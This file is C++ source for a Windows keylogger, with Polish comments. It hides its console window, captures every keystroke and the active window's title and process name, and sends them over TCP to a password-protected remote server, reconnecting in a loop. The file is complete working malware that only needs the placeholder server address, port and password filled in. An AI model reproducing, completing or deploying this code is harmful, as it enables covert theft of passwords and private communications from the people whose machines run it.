#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <winsock2.h>
#include <windows.h>
#include <psapi.h>
#include <iostream>
#include <string>
#include <unordered_map>
#include <locale>
#include <codecvt>
#include <thread>
#include <atomic>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "psapi.lib")

std::unordered_map<int, std::string> specialKeys = {
    {VK_BACK, "BACKSPACE"}, {VK_TAB, "TAB"},     {VK_RETURN, "ENTER"},
    {VK_SHIFT, "SHIFT"},    {VK_CONTROL, "CTRL"}, {VK_MENU, "ALT"},
    {VK_PAUSE, "PAUSE"},    {VK_CAPITAL, "CAPSLOCK"}, {VK_ESCAPE, "ESC"},
    {VK_SPACE, "SPACE"},    {VK_PRIOR, "PAGEUP"}, {VK_NEXT, "PAGEDOWN"},
    {VK_END, "END"},        {VK_HOME, "HOME"},   {VK_LEFT, "LEFT"},
    {VK_UP, "UP"},          {VK_RIGHT, "RIGHT"}, {VK_DOWN, "DOWN"},
    {VK_INSERT, "INSERT"},  {VK_DELETE, "DELETE"},{VK_NUMLOCK, "NUMLOCK"},
    {VK_SCROLL, "SCROLLLOCK"},{VK_LWIN, "LWIN"}, {VK_RWIN, "RWIN"},
    {VK_LSHIFT, "LSHIFT"},  {VK_RSHIFT, "RSHIFT"},{VK_LCONTROL, "LCTRL"},
    {VK_RCONTROL, "RCTRL"}, {VK_LMENU, "LALT"},  {VK_RMENU, "RALT"}
};

std::string toUtf8(wchar_t wch) {
    std::wstring_convert<std::codecvt_utf8<wchar_t>> conv;
    return conv.to_bytes(wch);
}

bool sendKey(SOCKET sock, const std::string& key) {
    std::string message = key + "\n";
    int sent = send(sock, message.c_str(), message.size(), 0);
    if (sent == SOCKET_ERROR) {
        closesocket(sock);
        return false;
    }
    return true;
}

void HideConsole() {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
}

std::atomic<bool> running(true);

std::string getActiveWindowInfo() {
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return "UNKNOWN_WINDOW";

    char title[256];
    GetWindowTextA(hwnd, title, sizeof(title));

    DWORD pid;
    GetWindowThreadProcessId(hwnd, &pid);

    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    char procName[MAX_PATH] = "unknown.exe";

    if (hProc) {
        HMODULE hMod;
        DWORD cbNeeded;
        if (EnumProcessModules(hProc, &hMod, sizeof(hMod), &cbNeeded)) {
            GetModuleBaseNameA(hProc, hMod, procName, sizeof(procName));
        }
        CloseHandle(hProc);
    }

    return std::string(procName) + " – " + std::string(title);
}

void receiverThread(SOCKET sock) {
    char buffer[64];
    while (running) {
        int bytesReceived = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (bytesReceived <= 0) {
            // rozłączony lub błąd
            running = false;
            break;
        }

        buffer[bytesReceived] = '\0';
        std::string msg(buffer);
        if (msg.find("DISCONNECT") != std::string::npos) {
            running = false;
            break;
        }
    }
}

void keyloggerLoop(SOCKET sock) {
    std::string lastWindow = "";
    DWORD lastPing = GetTickCount();

    while (running) {
        // Zmiana aktywnego okna
        std::string currentWindow = getActiveWindowInfo();
        if (currentWindow != lastWindow) {
            if (!sendKey(sock, "[WINDOW] " + currentWindow)) {
                running = false;
                break;
            }
            lastWindow = currentWindow;
        }

        // Obsługa klawiszy
        for (int key = 1; key < 256; ++key) {
            SHORT state = GetAsyncKeyState(key);
            if (state & 0x8000) {
                std::string toSend;

                if (specialKeys.count(key)) {
                    toSend = specialKeys[key];
                }
                else {
                    BYTE keyboardState[256];
                    GetKeyboardState(keyboardState);

                    wchar_t buffer[4];
                    int result = ToUnicode(key, MapVirtualKey(key, MAPVK_VK_TO_VSC), keyboardState, buffer, 4, 0);

                    if (result > 0) {
                        toSend = toUtf8(buffer[0]);
                    }
                }

                if (!toSend.empty()) {
                    if (!sendKey(sock, toSend)) {
                        running = false;
                        break;
                    }
                }

                Sleep(100); // aby nie spamować tym samym klawiszem
            }
        }

        // Wysyłanie PING co 10 sekund
        if (GetTickCount() - lastPing > 10000) {
            if (!sendKey(sock, "[PING]")) {
                running = false;
                break;
            }
            lastPing = GetTickCount();
        }

        Sleep(10);
    }
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    HideConsole();

    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    const char* SERVER_IP = "server_ip";
    const int SERVER_PORT = server_port;
    const char* PASSWORD = "server_password\n";

    while (true) {
        running = true;

        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            Sleep(5000);
            continue;
        }

        sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(SERVER_PORT);
        serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP);

        if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == 0) {
            // Wyślij hasło
            if (send(sock, PASSWORD, strlen(PASSWORD), 0) == SOCKET_ERROR) {
                closesocket(sock);
                continue;
            }

            // Oczekiwanie na AUTH_OK z timeoutem
            fd_set readfds;
            FD_ZERO(&readfds);
            FD_SET(sock, &readfds);

            timeval timeout;
            timeout.tv_sec = 5;
            timeout.tv_usec = 0;

            int sel = select(0, &readfds, nullptr, nullptr, &timeout);
            if (sel > 0 && FD_ISSET(sock, &readfds)) {
                char response[64] = { 0 };
                int received = recv(sock, response, sizeof(response) - 1, 0);

                if (received > 0 && std::string(response).find("AUTH_OK") != std::string::npos) {
                    std::thread recvThread(receiverThread, sock);
                    keyloggerLoop(sock);
                    recvThread.join();
                }
            }

            closesocket(sock);
        }

        closesocket(sock);
        Sleep(3000); // Odczekaj przed ponowną próbą
    }

    WSACleanup();
    return 0;
}
